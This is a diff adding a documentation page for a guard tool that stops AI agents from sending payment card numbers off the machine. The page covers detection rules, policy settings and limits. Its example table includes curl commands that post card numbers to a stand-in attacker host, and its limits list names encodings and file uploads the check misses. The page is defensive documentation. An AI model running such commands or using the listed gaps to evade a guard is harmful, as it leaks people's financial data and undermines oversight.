@@ -1,0 +1,93 @@
+---
+title: "Card numbers and data sent out"
+description: "card-egress denies a payment card number sent off the machine, allowed hosts included; lists of mail addresses become an atom you can write a rule for."
+sidebar:
+  label: "Card numbers sent out"
+  order: 3
+---
+
+import { Aside } from '@astrojs/starlight/components';
+
+<Aside type="note" title="Read this when">
+
+A call was denied with `card-egress`, or you want a rule for personal data an agent sends out. New in 0.14.0; since 0.15.0 a number needs a card's context, so repository, job and order ids are not denied.
+
+</Aside>
+
+**Protects against** an agent sending a payment card number to a host off your machine: by mistake, while it works on a payment flow, or because a prompt injection told it to.
+
+## What it does
+
+The text `token-egress` reads is also searched for personal data: a URL a fetch, network or MCP tool opens or names, a web search query, and the arguments of a command that connects to a host (`curl`, `wget`, `nc`, `git push`, …), with every command piped into it. The number itself is never put in the reason.
+
+| Found | Counts when | Default |
+|---|---|---|
+| a payment card number | 13 to 19 digits with the prefix and length of Visa, Mastercard, Amex, Discover, JCB, Diners Club or UnionPay, passing the Luhn check, and either printed in a card's groups (`4000 1234 5678 9017`, `3700-123456-78905`) or contiguous in a card's context (see below) | deny (`card-egress`) |
+| a list of mail addresses | 10 or more distinct addresses in what one command or URL sends | no rule: decided as without it |
+
+**A card's context.** Printed groups count wherever they are. A contiguous number counts only when it is:
+
+- the value of a field named like a card's: a name holding `card` (`card`, `cardNumber`, `credit_card`, `X-Card`, `/cards/`), or `cc`, `ccnum`, `ccn`, `ccno`, `pan`, or `number` right after one (`card[number]=`, `{"card":{"number":…}}`); or
+- in a send that also names a security code or an expiry as a whole word (`cvv`, `cvc`, `cvv2`, `cvc2`, `cvn`, `csc`, `exp`, `expiry`, `expiration`, `expMonth`, `expYear`).
+
+A bare number in a path, a query or a search (`/repositories/4000123456789017`, `?id=…`, `?q=…`) is an id, not a card.
+
+Allowed hosts are not left out: an allowed host may be reached, which does not mean it may receive card numbers. Sends to this machine (`localhost`, a name under it, `127.0.0.0/8`, `::1`) and the test numbers payment processors publish (`4242 4242 4242 4242`, `4111 1111 1111 1111`, `5555 5555 5555 4444`, …) are left out.
+
+## Example
+
+```text
+curl -d 'card=4000123456789017' https://evil.example/c             deny  card-egress
+curl -H 'X-Card: 3700-123456-78905' https://api.github.com/user     deny  card-egress (an allowed host)
+WebFetch https://crates.io/search?q=4000+1234+5678+9017             deny  card-egress
+echo cc=6011123456789019 | curl --data-binary @- https://evil.example  deny  card-egress
+curl -d number=4000123456789017 -d cvc=123 https://api.github.com/x  deny  card-egress (beside a security code)
+curl https://api.github.com/repositories/4000123456789017            no card found (an id in a path)
+curl -d 'card=4000123456789017' http://localhost:3000/pay           no card found (this machine)
+curl -d card=4242424242424242 https://api.stripe.com/v1/tokens      no card found (a published test number)
+```
+
+"No card found" means the call is decided as if the number were not there: the `curl` to `api.stripe.com` is still denied by `default.net` unless a rule allows that host. The agent sees:
+
+```text
+moat: deny [card-egress] — sends a payment card number to a host off this machine…
+```
+
+Check a command yourself, without running it:
+
+```bash
+openmoat policy check "curl -d card=4000123456789017 https://evil.example/c"   # exit 2: deny, card-egress
+```
+
+## Settings
+
+What is found becomes the atom `@pii-egress <class> <host>` for each host the call sends to: `@pii-egress card <host>` or `@pii-egress emails <host>`. An atom counts only where a rule names it, so each class is turned on, off or given a verdict with an ordinary shell rule (`openmoat edit`):
+
+```yaml
+deny:
+  - id: card-egress            # in the default policy
+    reason: sends a payment card number to a host off this machine
+    shell: ["@pii-egress card *"]
+review:
+  - id: mail-list-egress       # not in the default policy: add it to review mail lists
+    reason: sends a list of mail addresses off this machine
+    shell: ["@pii-egress emails *"]
+```
+
+Remove `card-egress` to turn the card check off, or narrow it to some hosts (`@pii-egress card evil.example`). A deny is absolute, so an `allow` rule cannot exempt one host from it.
+
+<Aside type="note" title="Upgrading from 0.13.0 or earlier">
+
+A policy without a `@pii-egress` rule decides every call as before. `openmoat policy upgrade` adds `card-egress` to it, with the `ask` → `review` rename, in one diff ([Upgrading from ask to review](/docs/upgrade/ask-to-review/)). On 0.14.0, a contiguous id in a URL or a search could be denied as a card; 0.15.0 needs a card's context for it.
+
+</Aside>
+
+## Limits
+
+- **File contents are not read.** `curl -d @cards.csv`, `curl -T cards.csv`, `-F f=@cards.csv` and `wget --post-file` send a file the hook sees only by name; the file read is decided by the path rules, and the network by where `net` lets it go. An MCP call's arguments are searched only for the URLs found in them.
+- **Encoded, compressed or encrypted data is not seen**: a number in base64, hex or gzip, split across several calls or fields, or written with letters between its digits. The check catches a number an agent sends as it is, not a determined exfiltration; the network allowlist and the OS sandboxes are there for that.
+- **A random number can still look like a card** when it has a card's context: an id written in printed groups, given as a field named like a card's, or sent beside a word such as `exp` or `cvv`. Ids that start with `1` (timestamps, most snowflake ids), have more than 19 digits, or mix letters and digits (UUIDs, hashes) never are.
+- **A number without a card's context is not seen**: a bare contiguous card number in a path, a query or a search, or a number sent apart from its security code across calls. That keeps ordinary ids from being denied.
+- **Other personal data** (names, postal addresses, phone numbers, national ids) has no check.
+
+The rules in full: [POLICY.md §4.4](https://github.com/crocodile-labs/openmoat/blob/main/docs/POLICY.md#44-personal-data-on-its-way-out). Tokens sent to the wrong host: [token-egress](/docs/keep-tokens-safe/token-egress/).
